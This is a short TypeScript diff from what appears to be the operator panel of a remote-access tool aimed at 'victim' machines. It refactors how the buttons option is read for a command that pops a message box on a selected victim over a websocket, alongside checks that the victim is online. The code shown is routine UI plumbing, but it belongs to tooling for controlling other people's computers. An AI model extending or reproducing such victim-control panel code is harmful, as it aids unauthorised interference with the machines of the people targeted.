@@ -14,6 +14,7 @@ export function bindRoflActions(p: {
     qc: QueryClient;
     ws: PanelWsLike;
     getIconValue?: () => string;
+    getButtonsValue?: () => string;
 }): (() => void) | void {
     const { selectedVictimId, qc, ws } = p;
 
@@ -38,8 +39,9 @@ export function bindRoflActions(p: {
     const getIconValue = p.getIconValue || (() => "info");
     const msgHeaderInput = document.getElementById("roflMsgHeader") as HTMLInputElement | null;
     const msgContentInput = document.getElementById("roflMsgContent") as HTMLTextAreaElement | null;
-    const msgButtonsSelect = document.getElementById("roflMsgButtons") as HTMLSelectElement | null;
     const msgSendBtn = document.getElementById("roflMsgSendBtn") as HTMLButtonElement | null;
+
+    const getButtonsValue = p.getButtonsValue || (() => "ok");
 
     if (!urlInput || !openBtn) return;
 
@@ -194,7 +196,7 @@ export function bindRoflActions(p: {
         if (!ensureWs()) return;
         if (!ensureVictimOnline()) return;
         const iconVal = String(getIconValue()).trim() || "info";
-        const buttonsVal = msgButtonsSelect && msgButtonsSelect.value ? String(msgButtonsSelect.value).trim() : "ok";
+        const buttonsVal = String(getButtonsValue()).trim() || "ok";
         const headerVal = msgHeaderInput && msgHeaderInput.value ? String(msgHeaderInput.value).trim() : "";
         const contentVal = msgContentInput && msgContentInput.value ? String(msgContentInput.value).trim() : "";
         const cmd = `msgbox|${iconVal}|${buttonsVal}|${headerVal}|${contentVal}`;
